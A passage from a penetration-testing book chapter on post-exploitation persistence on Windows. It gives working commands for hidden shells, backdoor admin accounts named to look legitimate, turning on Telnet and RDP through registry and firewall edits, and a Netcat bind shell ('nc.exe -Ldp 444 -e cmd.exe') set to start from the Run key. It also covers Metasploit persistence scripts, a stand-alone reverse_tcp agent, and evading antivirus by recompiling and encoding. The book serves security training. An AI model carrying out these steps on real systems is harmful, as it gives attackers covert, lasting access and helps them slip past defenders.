using encryption.
In this chapter you will learn about the following:
• Compromising existing system and application files for remote access
• Creating persistent agents
• Maintaining persistence with the Metasploit Framework
• Redirecting ports to bypass network controls
Compromising the existing system and
application files for remote access
The best persistent agent is one that does not need to be hidden because it is part of
the existing file structure of the compromised system; the attacker only has to add
certain functionality to convert regular system files and applications into persistent
agents. This approach can almost never be detected by security controls such as
intrusion detection systems.
Remotely enabling the Telnet service
One technique used to maintain remote access is to use the Metasploit Framework to
enable the Telnet service on a Windows platform and use it to provide persistence.
The first step is to compromise the target system to obtain a meterpreter session
(migrate the session to ensure a stable shell) and then elevate access privileges.
[ 150 ]
Chapter 6
Next, obtain a local command shell to access the target system using the
following command:
meterpreter> execute -H -f cmd -i
When executed, this command creates an interactive command shell (-i) that acts
as a hidden process (-H).
Using the command prompt of the shell, create a new user account. When
creating user accounts to ensure persistence, many attackers use the following
two-part strategy:
• Create an account with a name that will attract attention if the compromise is
investigated (for example, Leet7737)
• Create an account that appears to be part of normal system functions, such as
Service_Account, using the following commands:
C:\net user Service_Account password /ADD
C:\net localgroup administrators Service_Account /ADD
When the new user accounts have been created, exit the Windows command shell.
To enable Telnet, run the following command from the meterpreter prompt:
run gettelnet -e
The execution of the previous command is shown in the following screenshot:
[ 151 ]
Post Exploit – Persistence
The script shown in the previous screenshot creates a persistent Telnet service on
the compromised system. To access it, connect to the system's IP address using the
Telnet protocol and provide the username and password that were used to create the
account, as shown in the following screenshot:
The Telnet service will persist until it is removed. Unfortunately, there are some
limitations to using Telnet: it is readily detectable (especially because credentials
are transmitted in the clear) and it functions only in the command-line mode.
However, what if you need to have a GUI to access certain applications on the
compromised system?
Remotely enabling Windows Terminal
Services
One of the most reliable techniques to ensure remote access is to persistently enable
Windows Terminal Services, also known as the Remote Desktop Protocol (RDP).
To do so, you must have administrator privileges and know the version of the
target's operating system.
For example, if the target is Windows 7, use meterpreter to obtain an interactive
command shell on the target, and then enter the following commands to change
the registry:
C:\ reg add "hklm\system\currentControlSet\Control\Terminal
Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
C:\reg add "hklm\system\currentControlSet\Control\Terminal
Server" /v "fDenyTSConnections" /t REG_DWORD /d 0x0 /f
[ 152 ]
Chapter 6
To ensure that RDP will pass through the client-side firewall, add a rule using the
following command:
C:\ netshadvfirewall firewall set rule group="remote desktop"
new enable=Yes
Now we can start the RDP service using the following command:
C:\net start Termservice
The change launch RDP is not yet persistent; use the following command to start
RDP each time the computer is started:
C:\sc configTermService start= auto
The process of enabling RDP is not too complex, but it is one that should be scripted
to reduce the possibility of errors, especially when working with the system registry.
Fortunately, the meterpreter framework uses the GETGUI script to automatically
enable RDP services.
When run from the meterpreter prompt, the command line shown in the following
screenshot creates the account's username and password, hides the account from the
log-in screen, and makes the necessary changes to the registry to remain persistent.
The following screenshot shows the command used to create a username that
appears to be a legitimate account (Service Account) with a simple password.
To connect to the compromised remote desktop, use Kali's rdesktop program.
[ 153 ]
Post Exploit – Persistence
Remotely enabling Virtual Network Computing
If the system contains applications that are known to be compromised (especially
remote-access programs), it may be possible to take advantage of the existing
vulnerabilities to exploit the system. For example:
• It may be possible to extract remote-access passwords for some programs
from the registry. VNC stores passwords in the registry, and these can
be obtained by manually extracting the registry key or by uploading and
executing an application such as NirSoft's VNCPassView.
• Different versions of VNC contain different vulnerabilities that can be
exploited to compromise the application and gain remote access to the
system. If the user has a current version installed, it may be possible to
uninstall that version and install an older version in its place. Due to the
similarity of functionality among the versions, the user may not notice the
substitution, but an attacker can use the the authentication bypass exploits
found in older VNC versions to maintain access in the post-compromise phase.
Metasploit comes with the ability to introduce VNC directly to an exploited system
using the VNCINJECT module.
In the following screenshot, VNC was selected as the payload instead of the regular
reverse_TCP shell:
[ 154 ]
Chapter 6
This attack does not require any authentication. If you're testing a client site, ensure
that all vulnerable applications are removed from the compromised system once the
vulnerability has been proved—otherwise, you've created an access point that can be
found and used by any other attacker!
Using persistent agents
Traditionally, attackers would place a backdoor on a compromised system—if the
front door provided authorized access to legitimate users, the backdoor applications
allowed attackers to return to an exploited system and access to services and data.
Unfortunately, the classical backdoors provided limited interactivity and were not
designed to be persistent on the compromised systems for very long time frames. This
was viewed as a significant shortcoming by the attacker community, because once the
backdoor was discovered and removed, there was additional work required to repeat
the compromise steps and exploit the system, which was made more difficult by the
forewarned system administrators defending the network and its resources.
Kali now focuses on persistent agents that if properly employed, are more difficult to
detect. The first tool we will review is the venerable Netcat.
Employing Netcat as a persistent agent
Netcat is an application that supports reading from and writing to network
connections using "raw" TCP and UDP packets. Unlike packets that are organized by
services such as Telnet or FTP, Netcat's packets are not accompanied by headers or
other channel information specific to the service. This simplifies communications and
allows for an almost-universal communication channel.
The last stable version of Netcat was released by Hobbit in 1996, and it has remained
as useful as ever; in fact, it is frequently referred to as the TCP/IP Swiss army knife.
Netcat can perform many functions, including the following:
• Port scanning
• Banner grabbing to identify services
• Port redirection and proxying
• File transfer and chatting, including support for data forensics
and remote backups
• Use as a backdoor or an interactive persistent agent, on a
compromised system
[ 155 ]
Post Exploit – Persistence
At this point, we will focus on using Netcat to create a persistent shell on a
compromised system. Although the following example uses Windows as the
target platform, it functions the same when used on a Unix-based platform.
In the example shown in the following screenshot, we will retain the executable's
name—nc.exe; however, it is common to rename it prior to use in order to minimize
detection. Even if it is renamed, it will usually be identified by antivirus software;
many attackers will alter or remove elements of Netcat's source code that are not
required and recompile it prior to use; such changes can alter the specific signature
that antivirus programs use to identify the application as Netcat, making it invisible
to antivirus programs.
Netcat is stored on Kali in the /usr/share/windows-binaries repository.
To upload it to a compromised system, enter the following command from
within meterpreter:
meterpreter> upload/usr/share/windows-binaries/nc.exe
C:\\WINDOWS\\system32
The execution of the previous command is shown in the following screenshot:
You do not have to place it in the system32 folder specifically; however, due to
the number and diversity of filetypes in this folder, this is the best location to hide a
file in a compromised system.
While conducting a penetration test on one client, we identified six
separate instances of Netcat on one server. Netcat had been installed
twice by two separate system administrators to support network
management; the other four instances were installed by external attackers
and were not identified until the penetration test. Therefore, always look
to see whether or not a Netcat is already installed on your target!
If you do not have a meterpreter connection, you can use Trivial File Transfer
Protocol (TFTP) to transfer the file.
Next, configure the registry to launch Netcat when the system starts up and ensure
that it is listening on port 444 (or any other port that you have selected, as long as it
is not in use) using the following command:
[ 156 ]
Chapter 6
meterpreter>reg setval -k
HKLM\\software\\microsoft\\windows\\currentversion\\run -vv nc
-d 'C:\\windows\\system32\\nc.exe -Ldp 444 -e cmd.exe'
Confirm that the change in the registry was successfully implemented using the
following queryval command:
meterpreter>reg queryval -k
HKLM\\software\\microsoft\\windows\\currentverion\\run -vv nc
Using the netsh command, open a port on the local firewall to ensure that the
compromised system will accept remote connections to Netcat. It is important
to know the target's operating system. The netsh advfirewall firewall
command-line context is used for Windows Vista, and Windows Server 2008 and
later versions; the netsh firewall command is used for earlier operating systems.
To add a port to the local Windows firewall, enter the shell command at the
meterpreter prompt and then enter rule using the appropriate command.
When naming the rule, use a name such as svchostpassthrough that suggests
that rule is important for the proper functioning of the system. A sample
command is shown as follows:
C:\Windows\system32>netsh firewall add portopening TCP 444
"service passthrough"
Confirm that the change was successfully implemented using the following command:
C:\windows\system32>netsh firewall show portopening
The execution of the previously mentioned commands is shown in the
following screenshot:
[ 157 ]
Post Exploit – Persistence
When the port rule is confirmed, ensure that the reboot option works.
• Enter the following command from the meterpreter prompt:
meterpreter> reboot
• Enter the following command from an interactive Windows shell:
C:\windows\system32>shutdown –r –t 00
To remotely access the compromised system, type nc at a command prompt, indicate
the verbosity of the connection (-v reports basic information and -vv reports much
more information), and then enter the IP address of the target and the port number,
as shown in the following screenshot:
Unfortunately, there are some limitations to using Netcat—there is no authentication
or encryption of transmitted data, and it is detected by nearly all antivirus software.
The lack of encryption can be resolved using cryptcat, a Netcat variant that uses the
Twofish encryption to secure data during transmission between the exploited host
and the attacker. Twofish encryption, developed by Bruce Schneier, is an advanced
symmetric block cipher that provides reasonably strong protection for encrypted data.
To use cryptcat, ensure that there is a listener ready and configured with a strong
password, using the following command:
root@kali:~# cryptcat –k password –l –p 444
Next, upload cryptcat to the compromised system and configure it to connect with
the listener's IP address using the following command:
C:\cryptcat –k password  444
[ 158 ]
Chapter 6
Unfortunately, Netcat and its variants remain detectable by most antivirus
applications. It is possible to render Netcat undetectable using a hex editor to alter the
source code of Netcat; this will help avoid triggering the signature matching action of
the antivirus, but this can be a long trial-and-error process. A more efficient approach
is to take advantage of the Metasploit Framework's persistence mechanisms.
Maintaining persistence with the
Metasploit Framework
Metasploit's meterpreter contains several scripts that support persistence on a
compromised system. We will examine two script options for placing a backdoor
on a compromised system: metsvc and persistence.
Using the metsvc script
The metsvc script is a network service wrapper for meterpreter that allows it to
either be used as a Windows service or run as a command-line application. It is
typically used as a backdoor to maintain communications with a compromised system.
To use metsvc, first compromise the system and then migrate meterpreter to the
explorer.exe process to obtain a more stable shell.
Execute the metsvc agent by invoking the run command, as shown in the following
screenshot. As you can see, it creates a temporary installation directory, uploads three
files (metsrv.dll, metsvc-server.exe, and metsvc.exe), and then starts metsvc.
[ 159 ]
Post Exploit – Persistence
To interact with the persistent metsvc agent, the attacker opens the Metasploit
Framework and selects use exploit/multi/handler with the payload windows/
metsvc_bind_tcp, as shown in the following screenshot. The other parameters
(IP address and port) are also set.
When the exploit command is executed, a session is opened directly between the
two systems, allowing for the escalation of privileges and other functions to occur
from the meterpreter command line. The execution of the exploit command is
shown in the following screenshot:
[ 160 ]
Chapter 6
The metsvc script requires no authentication; once the agent is in place, it can be
used by anyone to gain access to the compromised system. Most attackers would
not use this without altering the source code such that it requires authentication or
ensuring that there is some method in place to filter out remote connections.
More importantly, it is not a stealthy attack. Any attempt to list running processes,
such as entering the ps command from the meterpreter prompt, will identify
the metsvc service and the fact that the executable is running from a Temp
directory—which is very suspicious! In the following screenshot, the directory with
the random name (CvjrsZWOMK) located in the Temp folder is an obvious flag that
a system has been compromised:
A simple inspection of the Temp folder will identify the three hostile files, as shown
in the following screenshot; however, these will usually be flagged by an antivirus
before they are found by manual inspection.
Using the persistence script
A more effective approach for gaining persistence is to use the meterpreter
prompt's persistence script.
After a system has been exploited and the migrate command has moved the initial
shell to a more secure service, an attacker can invoke the persistence script from
the meterpreter prompt.
[ 161 ]
Post Exploit – Persistence
Using -h in the command will identify the available options for creating a persistent
backdoor, as shown in the following screenshot:
In the example shown in the following screenshot, we have configured persistence
to run automatically when the system boots and to attempt to connect to our listener
every 10 seconds. The listener is identified as the remote system (-r) with a specific
IP address and port. Additionally, we could elect to use the -U option, which will
start persistence when a user logs onto the system.
Note that we have arbitrarily selected port 444 for use by persistence; an
attacker must verify the local firewall settings to ensure that this port is
open, or use the reg command to open the port. Like most Metasploit
modules, any port can be selected as long as it is not already in use.
[ 162 ]
Chapter 6
The persistence script places a VBS file in a temporary directory; however, you can
use the -L option to specify a different location. The script also adds that file to the
local autorun sections of the registry.
Because the persistence script is not authenticated and anyone can use it to access
the compromised system, it should be removed from the system as soon as possible
after the discovery or completion of penetration testing. To remove the script,
confirm the location of the resource file for cleanup, and then execute the following
resource command:
meterpreter> run multi_console_command -rc
/root/.msf4/logs/persistence/RWBEGGS-
1E69067_20130920.0024/RWBEGGS-1E69067_20130920.0024.rc
Creating a standalone persistent agent
with Metasploit
The Metasploit Framework can be used to create a stand-alone executable that
can persist on a compromised system and allow interactive communications.
The advantage of a stand-alone package is that it can be prepared and tested in
advance to ensure connectivity and encoded to bypass local antivirus software.
To make a simple stand-alone agent, launch msfconsole on a command prompt
in Kali.
Use msfpayload to craft the persistence agent. In the example shown in the
following screenshot, the agent is configured to use a reverse_tcp shell that
will connect to the local host at 192.168.43.130 on port 4444. The agent,
named attack1.exe, will use a win32 executable template.
The stand-alone agent will only work on compromised systems with no antivirus
installed, or if the antivirus has first been disabled using the appropriate
meterpreter command. To bypass the antivirus, the backdoor must be encoded.
[ 163 ]
Post Exploit – Persistence
There are several different options for encoding the payload, as shown in the
following screenshot:
To see the available options, use the show encoders command.
Metasploit uses approximately 30 different encoders; by default, it will select the
most appropriate encoder if one is not specified.
A good general encoder to use is shikata_ga_nai. This encoder implements
polymorphic XOR additive feedback encoding against a 4-byte key, and it is the
only encoder ranked as "excellent" by Metasploit.
To encode the previously prepared attack.exe agent, we use the following